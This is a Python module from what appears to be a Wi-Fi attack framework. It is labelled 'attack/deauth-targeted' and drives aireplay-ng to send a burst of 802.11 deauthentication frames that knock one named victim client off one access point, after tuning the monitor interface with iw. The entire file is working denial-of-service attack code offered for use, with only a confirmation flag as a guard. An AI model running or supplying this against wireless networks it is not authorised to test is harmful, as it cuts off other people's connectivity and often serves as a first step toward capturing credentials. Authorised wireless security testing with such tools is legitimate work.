"""attack/deauth-targeted — disconnect one client from one AP."""

from __future__ import annotations

from wifipi.module import Module, RunContext
from wifipi.options import OptionSpec
from wifipi.procutil import run as run_proc


class DeauthTargeted(Module):
    NAME = "attack/deauth-targeted"
    CATEGORY = "attack"
    DESCRIPTION = "Targeted 802.11 deauth burst: kicks ONE client off ONE AP."
    OPTIONS = {
        "BSSID":   OptionSpec(required=True,  description="Target AP BSSID.", kind="bssid"),
        "CLIENT":  OptionSpec(required=True,  description="Victim MAC.", kind="mac"),
        "CHANNEL": OptionSpec(required=True,  description="AP channel.", kind="int"),
        "COUNT":   OptionSpec(required=False, default="10",
                              description="Deauth frames to send.", kind="int"),
    }
    REQUIRES_TOOLS = ["aireplay-ng", "iw"]
    BLOCKING = True
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "attacks"

    def build_argv(self, opts: dict) -> list[str]:
        iface = opts["MON_IFACE"]
        return [
            "aireplay-ng", "--deauth", str(opts["COUNT"]),
            "-a", opts["BSSID"],
            "-c", opts["CLIENT"],
            iface,
        ]

    def run(self, ctx: RunContext) -> int:
        iface = ctx.options.get("MON_IFACE")
        if not iface:
            print("[x] MON_IFACE not set")
            return 2
        run_proc(["iw", "dev", iface, "set", "channel", str(ctx.options["CHANNEL"])])
        argv = self.build_argv(ctx.options)
        # Foreground: let aireplay-ng print to the user's terminal live.
        return run_proc(argv).returncode
